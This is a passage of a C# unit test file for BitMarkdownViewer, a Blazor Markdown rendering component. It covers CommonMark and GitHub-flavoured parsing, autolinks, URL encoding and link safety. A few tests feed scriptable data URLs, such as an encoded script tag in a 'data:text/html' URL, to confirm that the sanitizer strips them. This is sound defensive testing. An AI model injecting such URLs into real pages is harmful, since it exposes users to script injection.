        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var headers = component.FindAll(".bit-mdv th");

        Assert.AreEqual("bit-mdv-align-left", headers[0].GetAttribute("class"));
        Assert.AreEqual("bit-mdv-align-center", headers[1].GetAttribute("class"));
        Assert.AreEqual("bit-mdv-align-right", headers[2].GetAttribute("class"));
        // Inline styles are unusable under a strict Content-Security-Policy.
        Assert.DoesNotContain("text-align:", component.Markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldLazyLoadImages()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "![a](/a.png)");
        });

        var img = component.Find(".bit-mdv img");

        Assert.AreEqual("lazy", img.GetAttribute("loading"));
        Assert.AreEqual("async", img.GetAttribute("decoding"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldAllowEmbeddedRasterImages()
    {
        const string data = "data:image/png;base64,iVBORw0KGgo=";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, $"![dot]({data})");
        });

        Assert.AreEqual(data, component.Find(".bit-mdv img").GetAttribute("src"));
    }

    [TestMethod]
    [DataRow("data:image/svg+xml,%3Csvg%3E")]
    [DataRow("data:text/html,%3Cscript%3E")]
    [DataRow("data:image/pngx,AAAA")]
    public void BitMarkdownViewerShouldBlockScriptableDataImages(string url)
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, $"![x]({url})");
        });

        Assert.IsFalse(component.Find(".bit-mdv img").HasAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldBlockDataUrlsInLinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[x](data:image/png;base64,iVBORw0KGgo=)");
        });

        Assert.IsFalse(component.Find(".bit-mdv a").HasAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderAriaLabelAndTabIndex()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# x");
            parameters.Add(p => p.AriaLabel, "Release notes");
            parameters.Add(p => p.TabIndex, "0");
        });

        var root = component.Find(".bit-mdv");

        Assert.AreEqual("Release notes", root.GetAttribute("aria-label"));
        Assert.AreEqual("0", root.GetAttribute("tabindex"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldExposeTheParsedDocument()
    {
        BitMarkdownDocumentNode? parsed = null;

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "# One\n\n## Two");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.Advanced);
            parameters.Add(p => p.OnParsed, (BitMarkdownDocumentNode d) => parsed = d);
        });

        Assert.IsNotNull(parsed);
        Assert.AreSame(parsed, component.Instance.Document);

        var headings = BitMarkdownAstHelper.Descendants(parsed).OfType<BitMarkdownHeadingNode>().ToList();

        Assert.AreEqual(2, headings.Count);
        Assert.AreEqual("one", headings[0].Id);
        Assert.AreEqual("two", headings[1].Id);
    }

    // -- CommonMark core corners --------------------------------------------

    [TestMethod]
    public void BitMarkdownViewerShouldRenderSetextHeadings()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Title\n=====\n\nSubtitle\n--------");
        });

        var markup = component.Markup;

        Assert.Contains("<h1>Title</h1>", markup);
        Assert.Contains("<h2>Subtitle</h2>", markup);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderHardBreaks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "one  \ntwo\\\nthree");
        });

        Assert.AreEqual(2, component.FindAll(".bit-mdv br").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderLooseListsWithParagraphs()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- one\n\n- two");
        });

        Assert.AreEqual(2, component.FindAll(".bit-mdv li > p").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderTightListsWithoutParagraphs()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- one\n- two");
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv li > p").Count);
        Assert.AreEqual(2, component.FindAll(".bit-mdv li").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldStartANewListWhenTheMarkerChanges()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "- one\n* two");
        });

        Assert.AreEqual(2, component.FindAll(".bit-mdv ul").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepEscapedPunctuationLiteral()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, @"\*not emphasis\* and \[not a link\]");
        });

        var markup = component.Markup;

        Assert.DoesNotContain("<em>", markup);
        Assert.Contains("*not emphasis* and [not a link]", component.Find(".bit-mdv p").TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldKeepPipesEscapedInsideTableCells()
    {
        var markdown = "| a | b |\n|---|---|\n| x \\| y | z |";

        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, markdown);
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        var cells = component.FindAll(".bit-mdv tbody td");

        Assert.AreEqual(2, cells.Count);
        Assert.AreEqual("x | y", cells[0].TextContent);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldTrimTrailingPunctuationFromAutolinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "Go to https://bitplatform.dev, now.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.AreEqual("https://bitplatform.dev", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    [DataRow("https://en.wikipedia.org/wiki/Foo_bar_baz")]
    [DataRow("https://example.com/a_(b)")]
    [DataRow("https://example.com/a~b")]
    [DataRow("https://example.com/_a_b")]
    public void BitMarkdownViewerShouldAutolinkUrlsContainingDelimiterCharacters(string url)
    {
        // The scanner emits a token per delimiter run, so an unpaired '_' / '*' / '~' inside
        // a bare URL would otherwise reach the autolink processor as several text nodes and
        // only the first fragment would be linked.
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, $"Go to {url} now.");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.AreEqual(url, component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldEncodeSpacesInUrls()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a](</my url>) and ![b](</my image.png>)");
        });

        Assert.AreEqual("/my%20url", component.Find(".bit-mdv a").GetAttribute("href"));
        Assert.AreEqual("/my%20image.png", component.Find(".bit-mdv img").GetAttribute("src"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotDoubleEncodeUrls()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a](/already%20encoded)");
        });

        Assert.AreEqual("/already%20encoded", component.Find(".bit-mdv a").GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotAutolinkInsideCode()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "`https://bitplatform.dev`");
            parameters.Add(p => p.Pipeline, BitMarkdownPipelines.GitHub);
        });

        Assert.AreEqual(0, component.FindAll(".bit-mdv a").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldMarkExternalLinksAsSafeToOpen()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[out](https://example.com)");
        });

        var link = component.Find(".bit-mdv a");

        Assert.AreEqual("_blank", link.GetAttribute("target"));
        Assert.AreEqual("noopener noreferrer", link.GetAttribute("rel"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldNotNestLinksInsideLinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "[a [b](https://b.com) c](https://a.com)");
        });

        var links = component.FindAll(".bit-mdv a");

        Assert.AreEqual(1, links.Count);
        Assert.AreEqual("https://a.com", links[0].GetAttribute("href"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderCodeBlockLanguageClass()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "```csharp\nvar x = 1;\n```");
        });

        Assert.AreEqual("language-csharp", component.Find(".bit-mdv pre code").GetAttribute("class"));
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderNestedBlockquotes()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "> outer\n>\n> > inner");
        });

        Assert.AreEqual(2, component.FindAll(".bit-mdv blockquote").Count);
    }

    [TestMethod]
    public void BitMarkdownViewerShouldRenderAngleBracketAutolinks()
    {
        var component = RenderComponent<BitMarkdownViewer>(parameters =>
        {
            parameters.Add(p => p.Markdown, "<https://bitplatform.dev> and <a@b.com>");
        });

        var links = component.FindAll(".bit-mdv a");

        Assert.AreEqual(2, links.Count);
        Assert.AreEqual("https://bitplatform.dev", links[0].GetAttribute("href"));
        Assert.AreEqual("mailto:a@b.com", links[1].GetAttribute("href"));
    }
}
